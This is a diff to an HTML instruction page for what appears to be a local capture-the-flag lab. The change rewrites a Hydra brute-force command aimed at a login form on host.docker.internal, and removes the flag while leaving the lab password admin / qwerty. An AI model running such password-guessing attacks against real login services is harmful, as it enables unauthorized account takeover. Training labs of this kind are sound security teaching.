@@ -110,12 +110,12 @@
               <span class="rule-num">Step 4</span>
               <span class="rule-text">
                 <strong>Run the Hydra Attack.</strong> Since you are attacking the host server from inside a Docker container, you must target <code>host.docker.internal</code>. Run this exact command inside your Kali terminal:
-                <div class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f host.docker.internal http-post-form "/api/brute-force-target:username=^USER^&password=^PASS^:Invalid username or password" -s 5000</div>
+                <div class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f host.docker.internal -s 5000 http-post-form "/api/brute-force-target:username=^USER^&amp;password=^PASS^:Invalid username or password"</div>
               </span>
             </li>
             <li class="rule-item">
               <span class="rule-num">Step 5</span>
-              <span class="rule-text"><strong>Capture the Flag.</strong> Hydra will test thousands of passwords. Within seconds, it will find the correct password (<code>qwerty</code>). Go back to the Target Page in your browser, login with <code>admin / qwerty</code>, and the screen will reveal the flag: <strong>CTF{brut3_f0rc3_m4st3r}</strong>.</span>
+              <span class="rule-text"><strong>Login.</strong> Hydra will test thousands of passwords. Within seconds, it will find the correct password (<code>qwerty</code>). Go back to the Target Page in your browser, and login with <code>admin / qwerty</code>.</span>
             </li>
           </ul>
         </div>
